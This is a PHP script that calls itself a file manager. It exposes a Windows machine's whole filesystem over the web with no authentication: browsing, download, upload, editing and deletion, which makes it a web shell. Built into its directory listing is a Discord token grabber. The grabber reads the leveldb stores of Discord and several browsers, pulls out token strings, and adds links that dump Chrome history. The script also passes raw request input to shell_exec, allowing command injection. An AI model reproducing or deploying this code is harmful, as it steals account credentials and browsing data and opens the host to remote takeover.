<?php
    #    coisafeia.php
    #    file manager
    #    ©guh industries

    $rawdir = 'C:\\';
    $dir = scandir($rawdir);
    if(isset($_REQUEST['path'])){
        $rawdir = str_replace("%20","\ ",realpath($_GET['path']) ? realpath($_GET['path']) : $_GET['path']);
        if(is_dir($_GET['path'])) {
            $dir = scandir($rawdir);
        } else {
            $e = preg_split("/[\\\\]+/", $rawdir);
            $dir = array("name" => $e[count($e)-1], "path" => $e);
        };
    };
    if(isset($_REQUEST['raw'])) {
        $e = preg_split("/[\\\\]+/", $_REQUEST['raw']);
        $l = $e[count($e)-1];
        #echo var_dump($e);
        if(isset($_REQUEST['dl'])) {
            header("Content-Disposition: attachment; filename=$l");
        };
        if(is_file($_REQUEST['raw']) && is_readable($_REQUEST['raw'])) {
            header('Content-Type:');
            readfile($_REQUEST['raw']);
            die();
        } else {
            echo 'nuh uh';
            die();
        };
    };

    function human_filesize($bytes, $decimals = 2) { #ggrks
        $factor = floor((strlen($bytes) - 1) / 3);
        if ($factor > 0) $sz = 'KMGT';
        return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$sz[$factor - 1] . 'B';
    }
    $is_sqlite = false;

    if(is_file($rawdir)){
        $aga = fopen($rawdir,'r');
        if(fread($aga,15) == 'SQLite format 3') $is_sqlite = true;
        fclose($aga);
    };


    function boiola($har){
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . $har, true, 303);
        exit();
    }

    $voltado = preg_split("/[\\\\]+/", $rawdir);
    unset($voltado[count($voltado)-1]);
    $voltado = join('\\',$voltado);

    if(isset($_GET['action'])) {
        switch($_GET['action']){
            case 'rename':
                if(!isset($_GET['newname'])) boiola($rawdir);
                $e[count($e)-1] = $_GET['newname'];
                rename($rawdir,join('\\',$e));
                boiola(join('\\',$e));
            break;
            case 'delete': 
                unlink($rawdir);
                boiola($voltado);
            break;
        };
    };

    if(isset($_POST['action'])) {
        switch($_POST['action']) {
            case 'upload':
                if(!isset($_FILES['arquivo'])){
                    echo "<h1> fairu doko </h1>";
                };
                if(move_uploaded_file($_FILES['arquivo']['tmp_name'], $rawdir . '\\' . ($_FILES['arquivo']['full_path'] ?? $_FILES['arquivo']['name']))){
                    echo '<h1 style="background-color:lightgreen;"> yippee <a href="?path=' . $rawdir . '\\' .  ($_FILES['arquivo']['full_path'] ?? $_FILES['arquivo']['name']) . '"> ' . $rawdir . '\\' .  ($_FILES['arquivo']['full_path'] ?? $_FILES['arquivo']['name']) . ' </a> </h1>';
                } else {
                    echo '<h1 style="background-color:red;"> fairu upload shitanai (error) </h1>';
                }
            break;
            case 'edit':
                if(!isset($_POST['content'])){
                    echo '<h1 style="background-color:red;"> wtf where new content </h1>';
                } elseif(!is_readable($rawdir)) {
                    echo '<h1 style="background-color:red;"> unable to write (its actually a folder/read only) </h1>';
                } else {
                    file_put_contents($rawdir, $_POST['content']);
                    echo '<h1 style="background-color:lightgreen;"> successfully edited </h1>';
                };
            break;
        };
    };
    
    echo '<h3>' . $rawdir . '</h3>';
    echo '<style> *{font-size:18px} table,tr,td,th{border:1px solid black;border-collapse:collapse;}</style>';
    if(is_dir($rawdir)) {?>
        <form action="" method="post" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <input type="hidden" name="path" value="<?=$rawdir?>">
            <input type="file" name="arquivo">
            <input type="submit">
        </form>
        <p></p>
        <label for="qa">asdpkfgnhlxfgh</label>
        <select name="qa" id="qa">
            <option value="chrome" selected>chrome</option>
            <option value="discord">discord</option>
        </select>
        <script>
            document.body.onload = ()=>{
                const socoror = e=>{
                    const selection = e
                    switch(selection){
                        case "chrome":
                            for(const DESGRAÇA of document.querySelectorAll('.q')) {
                                DESGRAÇA.href = DESGRAÇA.querySelector('input[name="chrome"]').value;
                            }
                        break;
                        case "discord":
                            for(const DESGRAÇA of document.querySelectorAll('.q')) {
                                DESGRAÇA.href = `javascript: console.log(${DESGRAÇA.querySelector('input[name="tokens"]').value})`;
                            }
                        break;
                    };
                }
                console.log(1);
                document.querySelector('#qa').addEventListener('change',e=>{socoror(event.target.value.substring(e.target.selectionStart,e.target.selectionEnd))})
                socoror('chrome')
            }
        </script>
            <table>
                <tr>
                    <th>
                        :3
                    </th>
                    <th>
                        asdpkfgnhlxfgh
                    </th>
                </tr>
            <?php 
                for($i = 0; $i < count($dir); $i++) {?>
                    <tr>
                    <td><p><a href="?path=<?=$rawdir . '\\' . $dir[$i]?>">
                    <?php
                    if(is_dir($rawdir . '\\' . $dir[$i])) {
                        echo "\u{1f4c2}";
                    };
                ?><?=$dir[$i]?></a></p></td>
                    <td> <a class="q">welcome to my woorld *gets chalked* <form><input type="hidden" name="tokens" value='<?php 
                                    $euqueromematar = '';
                                    $reg="/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/";
                                    $folders=['appdata\\Discord',"appdata\\discordcanary","appdata\\discordptb","localappdata\\Google\\Chrome\\User Data\\Default","appdata\\Opera Software\\Opera Stable","appdata\\Opera Software\\Opera GX Stable","localappdata\\BraveSoftware\\Brave-Browser\\User Data\\Default","localappdata\\Yandex\\YandexBrowser\\User Data\\Default"];
                                    $userdir=$rawdir;
                                    $localappdata=$userdir.'\\AppData\\Local';
                                    $appdata=$userdir.'\\AppData\\Roaming';
                                    foreach($folders as $browser){
                                        $browser=preg_replace("/localappdata/",$localappdata,$browser);
                                        $browser=preg_replace("/appdata/",$appdata,$browser);
                                        $leveldb=$browser.'\\Local Storage\\leveldb';
                                        if(is_dir($leveldb)){
                                            $guh=scandir($leveldb);
                                            $cuh=array_filter($guh,function($v,$k){
                                                return substr($v,-4)==".ldb";
                                            },ARRAY_FILTER_USE_BOTH);
                                            foreach($cuh as $ii=>$dbfile){
                                                $data=file_get_contents($leveldb.'\\'.$dbfile);
                                                if(preg_match_all($reg,$data)>0){
                                                    $euqueromematar = $euqueromematar . '"file":"'.$leveldb.'\\'.$dbfile.'","';
                                                    preg_match("/(\d{2}\/){2}\d{4}\s\d{2}:\d{2}/", shell_exec('for %A in ("'.$leveldb.'\\'.$dbfile.'") do echo %~tA'),$guhh);
                                                    $euqueromematar = $euqueromematar . '"modify":'.$guhh[0].'",';
                                                    $aaaaa=[];
                                                    preg_match($reg,$data,$aaaaa);
                                                    $euqueromematar = $euqueromematar . '"tokens":[';
                                                    foreach($aaaaa as $iii=>$token){
                                                        $euqueromematar = $euqueromematar . '"'.$token.'",';
                                                    };
                                                    $euqueromematar = $euqueromematar . "]}";
                                                    };
                                                };
                                            };
                                        }; 
                                        echo $euqueromematar;
                                    ?>'> <input type="hidden" name="chrome" value='?path=<?=$rawdir . '\\' . $dir[$i]?>\\AppData\\Local\\Google\\Chrome\\User%20Data\\Default\\History&action=sqlite&query=.dump'> </form></a> </td>
                </tr>
                <?php
                };
            ?>
            </table>
              <?php  
    } elseif(isset($_REQUEST['action'])){ 
        switch($_REQUEST['action']){
            case 'edit': ?>
        <p><a href="?path=<?=$rawdir?>"> Return </a></p>
        <?php 
            if(is_dir($rawdir)) { ?>
                <h2 style="background-color:red;">not a file (its a folder)</h2>
            <?php } else { ?>
                <h2 style="background-color:red;"> <?=!is_readable($rawdir) ? 'kono fairu wa NOT READABLE desu nihonfo jouzu (are you sure its not a folder)' : ''?></h2>
                <h2 style="background-color:red;"> <?=!is_writable($rawdir) ? 'kono fairu wa NOT WRITABLE desu (nihongo jjouzu) (are you sure its not a folder)' : ''?></h2>
                <div style="display:flex;flex-direction:column;">
                    <form action="" method="post">
                        <input type="hidden" name="path" value="<?=$rawdir?>">
                        <input type="hidden" name="action" value="edit">
                        <?php
                            if(is_readable($rawdir)){
                                if(filesize($rawdir) > 2097152) { ?>
                                    <h2 style="background-color:red;">kono fairu wa OOKI desu (nihongo ) (>2mb, wont read)</h2>
                                <?php } else { ?>
                                    <textarea spellcheck="false" name="content" cols="60" rows="30" <?=is_writable($rawdir) ? '' : 'readonly'?>><?=file_get_contents($rawdir)?></textarea>
                                    <p>
                                        <input style="font-size:20px;" type="submit" value="Confirm">
                                    </p>
                                <?php }
                            }
                        ?>
                    </form>
                </div>
            <?php }
        ?>
    <?php
            break;
            case 'sqlite':
                if(!is_file('./sqlite3.exe')){ ?>
                    <h1> sqlite3 cli is not installed (place sqlite.exe on the same folder as this php page)</h1>
                    <p><a href="?path=<?=$rawdir?>"> Return </a></p>
                <?php } elseif(!$is_sqlite){ ?>
                    <h1>
                        file is not sqlite
                    </h1>
                    <p><a href="?path=<?=$rawdir?>"> Return </a></p>
                <?php
                } else { 
                    $query = $_GET['query'] ?? '';
                    ?>
                    <p><a href="?path=<?=$rawdir?>"> Return </a></p>
                    <form action="">
                        <input type="hidden" name="path" value="<?=$rawdir?>">
                        <input type="hidden" name="action" value="sqlite">
                        <input id="g" type="text" name="query" style="width:300px;" placeholder="sqlite3 cli cmd" value="<?=$query?>" spellcheck="false">
                        <script>
                            const o = document.querySelector('#g');
                            o.focus();
                            o.select();
                        </script>
                    </form>
                    <?php
                    echo '<pre>' . shell_exec('sqlite3.exe -box "' . $rawdir . '" "' . $query . '" 2>&1') . '</pre>';
                }; ?>
            <?php
            break;
            default: ?>
                <h1>invalid action</h1>
                <p><a href="?path=<?=$rawdir?>"> Return </a></p>
            <?php
        }
    } else {
        ?>
        <div>
            <h2><?=is_readable($rawdir) ? human_filesize(filesize($rawdir)) : '??????' ?></h2>
            <p><a href="?path=<?=$voltado?>"> Return </a></p>
            <p><a href="?path=<?=$rawdir?>&action=delete"> Delete </a></p>
            <p><a href="?path=<?=$rawdir?>&action=edit"> Edit as text (not recommended if >1mb) </a></p>
            <button id="rename">Rename</button>
            <form action="" id="rform">
                <input type="hidden" name="path" value="<?=$rawdir?>">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="newname" value="" id="newname">
            </form>
            <form action="">
                <input type="hidden" name="raw" value="<?=$rawdir?>">
                <input type="submit" value="View raw file">
            </form>
            <form action="">
                <input type="hidden" name="raw" value="<?=$rawdir?>">
                <input type="hidden" name="dl" value="1">
                <input type="submit" value="Download">
            </form>
            <h2 style="background-color:red;"> <?=!is_readable($rawdir) ? 'kono fairu wa NOT READABLE desu nihonfo jouzu (are you sure its not a folder)' : ''?></h2>
            <h2 style="background-color:red;"> <?=!is_writable($rawdir) ? 'kono fairu wa NOT WRITABLE desu (nihongo jjouzu) (are you sure its not a folder)' : ''?></h2>
            <?php
                if($is_sqlite){?>
                    <h2 style="background-color:DodgerBlue;">
                        kono fairu wa (most likely) sqlite format (aaaaaaaaaaaaaaaaaaaaaaaaaaaa)
                    </h2>
                    <a href="?path=<?=$rawdir?>&action=sqlite&query=.dump"> sqlite query</a>
                <?php
                };
            ?>

            <script>
                document.querySelector('#rename').onclick = function(){
                    const porro = prompt("Rename <?=$e[count($e)-1]?>:", <?=$e[count($e)-1]?>)
                    if(confirm(`Would you like to rename "<?=$e[count($e)-1]?>" to "${porro}"?`)) {
                        document.querySelector('#newname').value = porro;
                        document.querySelector('#rform').submit()
                    }
                }
            </script>
<?php
    };
?>
